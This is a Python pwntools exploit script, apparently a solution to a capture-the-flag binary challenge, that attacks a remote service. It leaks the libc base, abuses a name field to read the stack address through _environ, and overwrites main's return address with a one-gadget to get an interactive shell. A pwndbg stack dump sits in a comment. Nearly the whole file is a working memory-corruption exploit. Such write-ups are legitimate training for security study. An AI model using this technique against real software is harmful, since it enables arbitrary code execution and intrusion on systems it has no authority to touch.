#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
# io = process('./pwn', env = {'LD_PRELOAD':'../x64_libc.so.6'})
io = remote('node2.buuoj.cn.wetolink.com', 28744)
# elf = ELF('./pwn')
libc = ELF('../x64_libc.so.6')
onegadget = 0x45216
def debug():
    binaryname = 'pwn'
    interruptPoint=0xaea
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFbase = 0
    libcBase = 0
    for inf in maps.readlines():
        if ELFbase == 0:
            if binaryname in inf:
                ELFbase = int(inf.split('-', 1)[0], 16)
        if libcBase == 0:
            if 'libc' in inf:
                libcBase = int(inf.split('-', 1)[0], 16)
    info('pid -> {}'.format(pid))
    success('elfbase', ELFbase)
    if interruptPoint :
        success('interruptPoint', interruptPoint+ELFbase)
    success('libcBase', libcBase)
    raw_input('debug>')

def add(size, author):
    io.sendlineafter('-> \n', '1')
    io.sendlineafter('gth: \n', str(size))
    io.sendafter('name:\n', author)

def edit(name, content):
    io.sendlineafter('-> \n', '2')
    io.sendafter('name:\n', name)
    io.sendafter('contents:\n', content)

def show():
    io.sendlineafter("-> \n", '3')


if __name__ == '__main__':
    # get libc
    io.sendlineafter("-> \n", '666')
    libcbase = int(io.recvuntil('\n', drop = True), 16) - libc.sym['puts']
    success('libc base', libcbase)
    libc.address = libcbase
    environ = libc.sym['_environ']
    sys = libc.sym['system']
    binsh = libc.search('/bin/sh').next()
    onegadget = onegadget + libc.address
    success('environ', environ)
    success('system', sys)
    success('binsh', binsh)
    success('onegadget', onegadget)

    # change chunk to environ to get the addr of stack
    auth = 'a' * 8 + p64(environ)
    add(0x30, auth)
    # debug()
    show()
    '''
    Breakpoint * 0x55daa919caea
pwndbg> stack
00:0000│ rsp  0x7fff331dfe28 —▸ 0x7f15f3acf830 ◂— mov    edi, eax
01:0008│      0x7fff331dfe30 ◂— 0x1
02:0010│      0x7fff331dfe38 —▸ 0x7fff331dff08 —▸ 0x7fff331e1fd0 ◂— 0x444c006e77702f2e /* './pwn' */
03:0018│      0x7fff331dfe40 ◂— 0x1f409bca0
04:0020│      0x7fff331dfe48 —▸ 0x55daa919ca50 ◂— sub    rsp, 0x18
05:0028│      0x7fff331dfe50 ◂— 0x0
06:0030│      0x7fff331dfe58 ◂— 0x8b6c24764fafd740
07:0038│      0x7fff331dfe60 —▸ 0x55daa919cb20 ◂— xor    ebp, ebp
pwndbg> distance 0x7fff331dff18 0x7fff331dfe28
0x7fff331dff18->0x7fff331dfe28 is -0xf0 bytes (-0x1e words)
    '''
    stack = u64(io.recv(6).ljust(8, '\x00'))
    retaddr = stack - 0xf0
    success('return', retaddr)
    auth = 'b'*8 + p64(retaddr)

    edit(auth, p64(onegadget))
    
    # make program return from main
    io.sendlineafter('-> \n', '5')
    




    io.interactive()
    io.close()
